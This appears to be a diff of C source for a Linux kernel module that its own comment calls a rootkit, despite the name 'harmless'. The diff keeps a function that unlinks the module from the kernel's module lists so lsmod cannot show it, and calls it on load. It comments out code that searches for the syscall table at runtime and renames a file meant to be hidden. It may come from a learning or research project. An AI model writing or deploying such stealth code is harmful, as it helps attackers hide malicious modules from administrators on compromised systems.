@@ -7,13 +7,16 @@ MODULE_LICENSE("GPL") ;
 
 
 static unsigned long *syscall_table;
-static char *dir_cod = "hide_this";
+static char *dir_cod = "hide_this_file";
 
 
 module_param(dir_cod, charp, 0000); // < Param desc. charp = char ptr,  can be read/not changed
-MODULE_PARM_DESC(name, "The name to display in /var/log/kern.log");  ///< parameter description
 
 
+/**
+* Function to search for the syscall_table during run time
+*
+*
 unsigned long *dinamically_find_syscall_table(void) {
     unsigned long *syscall_table;
     unsigned long int i;
@@ -27,10 +30,10 @@ unsigned long *dinamically_find_syscall_table(void) {
     }
     return NULL;
 }
+*/
 
 /**
 *	Function to hide module from lsmod
-*
 */
 static void module_hide(void){
        list_del(&THIS_MODULE->list);
@@ -38,19 +41,17 @@ static void module_hide(void){
        list_del(&THIS_MODULE->mkobj.kobj.entry);
 }
 
-/** @brief The LKM initialization function
- *  The static keyword restricts the visibility of the function to within this C file. The __init
- *  macro means that for a built-in driver (not a LKM) the function is only used at initialization
- *  time and that it can be discarded and its memory freed up after that point.
- *  @return returns 0 if successful
- */
+
+// Rootkit hides itself
 static int __init harmless_init(void){
-    module_hide();
-    syscall_table = dinamically_find_syscall_table();
     printk(KERN_INFO "harmless: Hello from the harmless LKM!\n");
+    module_hide();
+    /*
+    syscall_table = dinamically_find_syscall_table();
     if(syscall_table == NULL)
       printk(KERN_INFO "Couldn't find syscall_table????!\n");
       return -1;
+    */
     return 0;
 }
 
@@ -59,6 +60,8 @@ static void __exit harmless_exit(void){
    printk(KERN_INFO "harmless: Goodbye from the harmless LKM!\n");
 }
 
-
+// Function called on module load
 module_init(harmless_init);
+
+// function called on module "unload"
 module_exit(harmless_exit);
